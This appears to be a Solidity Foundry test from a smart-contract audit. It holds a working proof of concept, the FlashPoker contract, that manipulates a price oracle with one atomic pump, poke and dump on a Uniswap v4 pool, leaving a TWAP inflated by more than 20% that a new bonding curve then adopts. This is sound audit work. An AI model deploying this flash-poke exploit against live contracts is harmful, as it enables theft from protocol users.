// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// OPEN FINDING (docs/audit-2026-11-14.md): this test demonstrates a vulnerability that is NOT fixed yet and
// passes while it exists. When the fix lands, invert its assertions into a regression test.

// HK-02 PoC. Place in contracts/test/audit/ (imports assume contracts/test/<dir>/).
// Run: forge test --mc HK02_TwapFlashPokeTest -vv

import {IntegrationBase} from "../integration/IntegrationBase.sol";
import {BondingCurve} from "../../src/BondingCurve.sol";
import {QuotePricer} from "../../src/QuotePricer.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {BalanceDelta} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @dev One tx, zero capital besides the pool fees: pump the reference pool, poke, dump back, settle the fee.
contract FlashPoker is IUnlockCallback {
    using TransientStateLibrary for IPoolManager;

    IPoolManager immutable pm;
    QuotePricer immutable pricer;
    address immutable base;
    address immutable usdg;
    PoolKey key;

    constructor(IPoolManager pm_, QuotePricer pricer_, PoolKey memory key_, address base_, address usdg_) {
        pm = pm_;
        pricer = pricer_;
        key = key_;
        base = base_;
        usdg = usdg_;
    }

    function run(uint256 usdgIn) external {
        pm.unlock(abi.encode(usdgIn));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm));
        uint256 amt = abi.decode(data, (uint256));
        bool zfo = Currency.unwrap(key.currency0) == usdg; // USDG in, base out: base/USD up
        BalanceDelta d1 = pm.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: zfo,
                amountSpecified: -int256(amt),
                sqrtPriceLimitX96: zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );
        pricer.poke(base); // snapshot taken at the flashed spot
        int128 got = zfo ? d1.amount1() : d1.amount0();
        pm.swap(
            key,
            IPoolManager.SwapParams({
                zeroForOne: !zfo,
                amountSpecified: -int256(uint256(uint128(got))),
                sqrtPriceLimitX96: !zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );
        // base nets to exactly 0; USDG shortfall = pool fees of the round trip
        int256 dU = pm.currencyDelta(address(this), Currency.wrap(usdg));
        if (dU < 0) {
            pm.sync(Currency.wrap(usdg));
            IERC20(usdg).transfer(address(pm), uint256(-dU));
            pm.settle();
        } else if (dU > 0) {
            pm.take(Currency.wrap(usdg), address(this), uint256(dU));
        }
        return "";
    }
}

/// @notice SEC-03 fix is incomplete: in lagged mode a poke snapshots the CURRENT spot and applies it to the future
///         until the next poke. A same-tx pump+poke+dump leaves the reference pool untouched but the recorded tick
///         persists, and the symmetric ±maxTickDelta clamp also slows honest pokes from undoing it.
contract HK02_TwapFlashPokeTest is IntegrationBase {
    FlashPoker fp;

    function setUp() public override {
        super.setUp();
        fp = new FlashPoker(manager, pricer, strategyUsdgKey, address(strategy), address(quote));
        quote.mint(address(fp), 10_000_000 * U);
    }

    function _next(uint256 dt) internal {
        vm.warp(vm.getBlockTimestamp() + dt);
        vm.roll(vm.getBlockNumber() + 1);
    }

    /// One ~$100 flash, no other pokes for 30 min (keeper down / sparse): launch bakes a ~22% overvalued quote.
    function test_single_flash_poke_persists() public {
        _next(3600);
        pricer.poke(address(strategy));
        uint256 p0 = pricer.quotePriceUsd(address(strategy));
        uint256 b0 = quote.balanceOf(address(fp));
        _next(1);
        fp.run(15_000 * U); // ~+2,800 ticks transiently; recorded +2,000 (clamp)
        _next(1800);
        uint256 spot = pricer.spotPriceUsd(address(strategy));
        uint256 twap = pricer.quotePriceUsd(address(strategy));
        emit log_named_decimal_uint("attacker cost (USDG)", b0 - quote.balanceOf(address(fp)), 18);
        emit log_named_decimal_uint("spot  USD", spot, 18);
        emit log_named_decimal_uint("TWAP  USD", twap, 18);
        assertApproxEqRel(spot, p0, 0.005e18, "reference pool restored");
        assertGt(twap, p0 * 120 / 100, "TWAP > +20% from one atomic flash");
        (BondingCurve c,) = _launchWithQuote(address(0), 0, 0); // default quote = STRATEGY
        assertApproxEqRel(c.quotePriceUsd(), twap, 1e15, "curve baked the manipulated quote price");
    }
}
